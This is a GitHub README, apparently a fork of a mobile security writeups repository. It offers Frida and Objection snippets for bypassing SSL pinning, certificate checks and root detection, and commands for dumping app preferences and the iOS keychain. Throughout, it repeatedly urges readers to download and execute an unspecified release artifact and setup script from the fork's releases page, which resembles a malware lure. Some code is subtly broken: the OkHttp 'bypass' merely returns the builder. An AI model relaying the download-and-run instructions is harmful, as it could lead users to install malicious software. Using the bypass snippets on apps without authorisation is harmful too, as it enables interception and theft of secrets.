https://github.com/Likplum/lautarovculic.github.io/releases

# Mobile Security Writeups: Android & iOS Hacking Guides and Tools 🔒📱

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Likplum/lautarovculic.github.io/releases)

Small repo. Big focus. Mobile app testing, reverse engineering, runtime hooking, and practical labs for Android and iOS. This repository collects writeups, Frida scripts, Objection tips, and quick cheats that I use during assessments and learning.

Badges
- [![Android](https://img.shields.io/badge/Topic-android-green)](https://github.com/topics/android)
- [![Frida](https://img.shields.io/badge/Topic-frida-yellowgreen)](https://github.com/topics/frida)
- [![iOS](https://img.shields.io/badge/Topic-ios-lightgrey)](https://github.com/topics/ios)
- [![Mobile Security](https://img.shields.io/badge/Topic-mobile--security-blueviolet)](https://github.com/topics/mobile-security)
- Topics: android, android-hacking, frida, ios, ios-hacking, mobile, mobile-hacking, mobile-security, mobile-security-cheatsheet, mobile-testing, mobile-writeups, objection, writeup

Hero images
- Android: ![Android Logo](https://upload.wikimedia.org/wikipedia/commons/3/3e/Android_logo_2019.png)
- iOS: ![iOS Icon](https://upload.wikimedia.org/wikipedia/commons/3/31/IOS_logo.svg)
- Frida: ![Frida Logo](https://frida.re/img/frida-icon-hex.svg)

Table of Contents
- About
- Releases
- Quick start
- Requirements
- Installation
- Usage examples
- Frida snippets
- Objection snippets
- Common labs and writeup template
- Contributing
- License
- References and resources

About
This repo documents hands-on mobile security work. You will find:
- Step-by-step writeups for common issues.
- Frida scripts for dynamic analysis.
- Objection tips for runtime testing.
- Small labs that reproduce real-world bugs.
- Cheatsheets for ADB, dyld, and common payloads.

I aim for practical, repeatable steps. Each writeup shows tools, commands, results, and remediation hints. Use this as a lab guide or a reference during assessments.

Releases
Download the release file from the releases page and execute the provided artifact as instructed. The release page contains packaged scripts, lab images, and utility binaries. Download and execute the file from this link: https://github.com/Likplum/lautarovculic.github.io/releases

Quick start
1. Clone the repo.
2. Install core tools (ADB, Frida, Objection).
3. Fetch the latest release artifact and run the included setup script.
4. Open the writeup for the target lab and follow steps.

Requirements
- ADB (Android Debug Bridge)
- Android SDK tools
- Frida (server and Python package)
- Objection
- Python 3.8+
- Xcode and ideviceinstaller (for iOS testing on macOS)
- Device with root or emulator for Android
- Jailbroken iOS device or simulator for deeper runtime hooks

Installation
1. Clone:
   git clone https://github.com/Likplum/lautarovculic.github.io.git
2. Install Python deps:
   pip install -r requirements.txt
3. Get release artifact:
   - Visit the release page and download the packaged file.
   - The release page is: https://github.com/Likplum/lautarovculic.github.io/releases
   - The release contains a setup script. Download and execute that script to install helper tools and lab images.
4. Start Frida server on device:
   - Push the matching Frida server binary to the device.
   - Run it with correct permissions.
5. Run sample lab:
   ./labs/run-lab-01.sh

Usage examples

ADB and app inspection
- List devices:
  adb devices
- Install APK:
  adb install -r app-debug.apk
- Pull APK:
  adb pull /data/app/com.example.app-1/base.apk
- Dump logs:
  adb logcat -c
  adb logcat -s Frida

Frida basics
- Start a simple script:
  frida -U -f com.example.app -l scripts/hook_ssl.js --no-pause
- Attach to running process:
  frida -U -n com.example.app -l scripts/dump_keys.js

Objection quick commands
- Patch SSL pinning:
  objection --gadget com.example.app explore
  > android sslpinning disable
- Dump database:
  objection --gadget com.example.app explore
  > ios dump_db

Frida snippets
Below are ready-to-use Frida snippets. Use them as starting points.

SSL pinning bypass (Android, in-process)
```js
Java.perform(function () {
  var OkHttpClient = Java.use('okhttp3.OkHttpClient$Builder');
  OkHttpClient.build.implementation = function () {
    var builder = this.build();
    console.log('OkHttpClient built, returning original builder');
    return builder;
  };
});
```

Bypass certificate validation (native functions)
```js
Interceptor.replace(Module.findExportByName('libssl.so', 'SSL_get_verify_result'), new NativeCallback(function() {
  return 0;
}, 'int', []));
```

Dumping shared prefs
```js
Java.perform(function () {
  var Context = Java.use('android.content.Context');
  var FileInputStream = Java.use('java.io.FileInputStream');
  var prefsPath = '/data/data/com.example.app/shared_prefs/com.example.app_preferences.xml';
  var fis = FileInputStream.$new(prefsPath);
  var BufferedReader = Java.use('java.io.BufferedReader');
  var InputStreamReader = Java.use('java.io.InputStreamReader');
  var br = BufferedReader.$new(InputStreamReader.$new(fis));
  var line;
  while ((line = br.readLine()) !== null) {
    console.log(line);
  }
});
```

Objection snippets
- List installed apps:
  objection --gadget com.example.app explore
  > android list activities
- Bypass root detection:
  objection --gadget com.example.app explore
  > android disable root-detection

Common labs and writeup template
Each lab in this repo follows a consistent template. Use the template to write new entries.

Template:
- Title
- Target: app name and version
- Test environment: OS, device, emulator, tools and versions
- Goal: what to find or exploit
- Steps:
  1. Recon: package name, activities, permissions
  2. Static analysis: decompile APK/IPA, inspect smali, classes.dex, Info.plist
  3. Dynamic analysis: Frida scripts, hooking points
  4. Exploit: patch, build, test
  5. Remediation
- Artifacts: exported DBs, screenshots, logs
- Commands and scripts used

Example lab: Bypass SSL pinning
- Target: com.example.app v1.2.3
- Environment: Android 10 emulator, Frida 16.0.6
- Recon:
  adb shell pm list packages | grep example
  aapt dump badging base.apk
- Static:
  jadx-gui base.apk -> search for "OkHttpClient"
- Dynamic:
  frida -U -f com.example.app -l scripts/okhttp_bypass.js --no-pause
- Result:
  Intercepted traffic with mitmproxy. Found API key in JSON.

Writeup style: keep logs, commands, and full outputs. Highlight root cause and remediation.

Useful commands and one-liners
- Extract string constants:
  strings base.apk | grep -i token
- Check certificate chain locally:
  openssl s_client -connect api.example.com:443 -showcerts
- Dump iOS keychain (with access):
  security find-generic-password -s "example" -w

Repository structure (example)
- /labs — hands-on exercises and images
- /writeups — detailed reports
- /scripts — helper scripts and Frida payloads
- /cheats — quick commands and snippets
- /artifacts — test APKs/IPAs and binary blobs
- README.md

Contributing
- Fork the repo.
- Add a lab or writeup in /writeups or /labs.
- Include exact commands and outputs.
- Add a LICENSE file if you include third-party artifacts.
- Open a pull request with a clear description and the target files.

License
This repository uses MIT License. See LICENSE file.

Contact
- GitHub: https://github.com/lautarovculic
- Issues: use the GitHub Issues page in this repo

References and resources
- Frida docs: https://frida.re/docs/home/
- Objection: https://github.com/sensepost/objection
- Android docs: https://developer.android.com/docs
- iOS security: https://developer.apple.com/security/

Releases and automation
- The releases page contains packaged labs and helper binaries.
- You must download and execute the release artifact to install local tools and labs. Visit and download from this URL: https://github.com/Likplum/lautarovculic.github.io/releases
- After download, run the included setup script in a shell and follow the minimal prompts to prepare labs and install helper utilities.

Examples of included files in releases
- frida-helpers.tar.gz — collection of Frida scripts
- labs-image-v1.zip — emulator images and APKs
- setup.sh — installer script that sets paths and pulls dependencies

Security practices used in the repo
- Reproducible steps. Provide commands for repeatable results.
- Isolate labs in emulators or disposable devices.
- Share sanitized logs and artifacts.
- Keep exploit code modular and labeled with intent.

Images and diagrams
- Add screenshots for each writeup. Use the images folder in each lab.
- Use simple diagrams to show data flow and attack surface.
- Example hosting for images uses raw GitHub links inside the repo for portability.

This README aims to make labs quick to run and easy to follow. Use the releases link at the top to get packaged tools and lab data, and run the included setup script to prepare your environment.